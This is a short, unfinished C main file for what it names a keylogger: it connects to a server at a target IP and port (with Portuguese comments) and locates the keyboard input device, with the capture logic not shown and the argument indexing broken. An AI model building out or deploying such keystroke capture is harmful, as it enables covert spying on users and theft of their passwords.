#include <stdio.h>
#include <stdlib.h>

#include "shared/protocol.h"
#include "keylogger.h"


// argv[0] = IP_ALVO argv[1] = PORT_ALVO
int main(int argc, char *argv[]){
    int server_fd = open_server_connection(argv[0], atoi(argv[1]));

    int keyboard_fd = find_keyboard_event();


}